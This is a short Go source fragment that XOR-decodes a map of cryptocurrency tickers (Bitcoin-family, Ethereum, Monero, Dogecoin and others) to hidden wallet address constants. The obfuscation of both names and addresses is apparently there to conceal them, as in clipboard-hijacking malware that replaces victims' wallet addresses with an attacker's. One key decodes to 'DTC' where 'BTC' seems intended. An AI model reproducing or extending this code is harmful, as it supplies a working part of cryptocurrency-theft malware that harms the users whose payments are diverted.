func itoa(n int) string { return strconv.Itoa(n) }

func dx(b []byte) string {
	out := make([]byte, len(b))
	for i, v := range b {
		out[i] = v ^ 0x5A
	}
	return string(out)
}

func buildCryptos() map[string]string {
	return map[string]string{
		dx([]byte{0x1e, 0x0e, 0x19}):             dx(_cBTC),
		dx([]byte{0x18, 0x19, 0x12}):             dx(_cBCH),
		dx([]byte{0x1f, 0x0e, 0x12}):             dx(_cETH),
		dx([]byte{0x02, 0x17, 0x08}):             dx(_cXMR),
		dx([]byte{0x16, 0x0e, 0x19}):             dx(_cLTC),
		dx([]byte{0x02, 0x19, 0x12}):             dx(_cXCH),
		dx([]byte{0x02, 0x16, 0x17}):             dx(_cXLM),
		dx([]byte{0x0e, 0x08, 0x02}):             dx(_cTRX),
		dx([]byte{0x1b, 0x1e, 0x1b}):             dx(_cADA),
		dx([]byte{0x1e, 0x1b, 0x09, 0x12}):       dx(_cDASH),
		dx([]byte{0x1e, 0x15, 0x1d, 0x1f}):       dx(_cDOGE),
	}
}

